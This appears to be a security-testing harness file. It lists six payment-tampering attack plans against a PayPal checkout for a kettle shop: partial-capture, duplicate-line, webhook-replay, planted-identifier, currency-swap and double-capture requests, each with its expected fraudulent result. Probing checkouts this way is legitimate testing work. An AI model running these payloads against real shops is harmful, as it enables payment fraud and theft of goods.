{
  "plans": [
    {
      "name": "Partial capture amount",
      "idea": "The create-order price is checked, but the capture endpoint forwards a client-supplied capture amount to PayPal or fails to compare the captured amount with the $64 order total.",
      "expect": "Only $0.01 is captured, yet the kettle order is marked shipped.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
          "body": {
            "amount": {
              "currency_code": "USD",
              "value": "0.01"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "USD",
                  "value": "0.01"
                }
              }
            ],
            "final_capture": true
          },
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Duplicate-line split",
      "idea": "Pricing deduplicates repeated SKUs, as the browser cart does, while fulfilment sums the raw order lines.",
      "expect": "Pay $64 once but receive two Copper Kettles.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              },
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Cross-order webhook credit",
      "idea": "The webhook handler confirms that the supplied capture ID is a real completed PayPal capture, but credits the shop order named by editable body fields without binding that capture to its original order or checking that it was already used.",
      "expect": "A newly created, unpaid order is shipped using the legitimate order's capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.custom_id": "{{a.body.ref}}",
            "resource.supplementary_data.related_ids.order_id": "{{a.body.paypalOrderId}}"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Planted payment identity",
      "idea": "Order creation accepts client-supplied shop-reference, PayPal-order, invoice, or capture identifiers, allowing a new order to share the legitimate paid order's identity; a completely unedited signed webhook then credits the newest matching order.",
      "expect": "A second kettle is shipped without any new PayPal capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ],
            "ref": "{{legit.shopOrderId}}",
            "shopOrderId": "{{legit.shopOrderId}}",
            "custom_id": "{{legit.shopOrderId}}",
            "reference_id": "{{legit.shopOrderId}}",
            "invoice_id": "KC-CAEDD9-05c2",
            "paypalOrderId": "{{legit.paypalOrderId}}",
            "orderId": "{{legit.paypalOrderId}}",
            "captureId": "{{legit.captureId}}",
            "paypalCaptureId": "{{legit.captureId}}"
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {},
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Currency denomination swap",
      "idea": "The shop forwards a client-selected currency or validates only the numeric amount 64.00 without requiring USD, so 64 JPY is treated as payment of a $64 basket.",
      "expect": "Pay ¥64 instead of $64 and receive the kettle.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "currency_code": "JPY",
            "currency": "JPY",
            "currencyCode": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "64.00"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "JPY",
                  "value": "64.00"
                },
                "items": [
                  {
                    "name": "Copper Kettle",
                    "sku": "KC-KETTLE",
                    "quantity": "1",
                    "unit_amount": {
                      "currency_code": "JPY",
                      "value": "64.00"
                    }
                  }
                ]
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Interleaved capture binding",
      "idea": "The capture handler inconsistently resolves the shop order from session/latest-order state instead of strictly from the PayPal order in the path, and a later sequential capture attempt trusts the already-completed capture to ship the remaining order.",
      "expect": "Two shop orders are shipped from one $64 PayPal capture.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal",
          "body": {
            "lines": [
              {
                "product": "KC-KETTLE",
                "count": 1
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
          "body": {},
          "times": 1,
          "together": false,
          "save": "c"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/paypal/{{b.paypalOrderId}}/capture",
          "body": {},
          "times": 1,
          "together": false,
          "save": "d"
        }
      ]
    }
  ]
}